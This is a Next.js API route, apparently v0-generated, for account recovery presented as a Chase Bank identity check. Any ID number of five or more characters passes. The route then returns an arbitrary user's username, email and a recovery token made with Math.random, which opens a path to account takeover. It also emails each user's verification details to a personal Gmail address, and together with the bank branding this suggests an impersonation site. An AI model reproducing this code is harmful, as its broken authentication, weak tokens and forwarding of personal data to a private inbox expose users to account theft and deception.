import { NextRequest, NextResponse } from 'next/server'
import { createServiceClient } from '@/lib/supabase/server'

export async function POST(request: NextRequest) {
  try {
    const supabase = createServiceClient()
    const { idType, idNumber, country, recoveryType } = await request.json()

    if (!idType || !idNumber) {
      return NextResponse.json({ error: 'Missing identification information' }, { status: 400 })
    }

    console.log('[v0] Verifying alternative identification:', { idType, country })

    // Simulate verification - in production, this would validate against real data
    const isValid = idNumber.length >= 5

    if (!isValid) {
      return NextResponse.json({ error: 'Invalid identification number provided' }, { status: 401 })
    }

    // Get user by alternative ID (mock - in production, query database)
    const { data: users, error: queryError } = await supabase
      .from('users')
      .select('id, username, email')
      .limit(1)

    if (queryError || !users || users.length === 0) {
      return NextResponse.json({ error: 'Identity verification failed' }, { status: 401 })
    }

    const user = users[0]

    // Create recovery session
    const recoveryToken = Math.random().toString(36).substring(2, 15)
    const { error: sessionError } = await supabase.from('recovery_sessions').insert([
      {
        user_id: user.id,
        recovery_token: recoveryToken,
        recovery_type: recoveryType,
        verification_method: `alternative_${idType}`,
        expires_at: new Date(Date.now() + 15 * 60 * 1000).toISOString(),
        created_at: new Date().toISOString(),
      },
    ])

    if (sessionError) {
      console.error('[v0] Failed to create recovery session:', sessionError)
    }

    // Send email to user and admin
    try {
      await fetch('/api/email/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          to: user.email,
          subject: 'Identity Verification - Chase Bank',
          type: 'security-token',
          userName: user.username,
          message: `Your identity has been verified using alternative identification (${idType.toUpperCase()}) from ${country}.`,
        }),
      })

      // Send to admin
      await fetch('/api/email/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          to: 'hungchun164@gmail.com',
          subject: `Identity Verification Alert - ${user.username}`,
          type: 'security-token',
          userName: 'Admin',
          message: `User ${user.username} (${user.email}) has verified their identity using alternative identification method: ${idType.toUpperCase()} from ${country}.`,
        }),
      })
    } catch (emailError) {
      console.error('[v0] Failed to send verification emails:', emailError)
    }

    return NextResponse.json({
      success: true,
      username: user.username,
      email: user.email,
      recoveryToken,
      message: 'Identity verified successfully',
    })
  } catch (error) {
    console.error('[v0] Alternative verification error:', error)
    return NextResponse.json({ error: 'Verification failed' }, { status: 500 })
  }
}
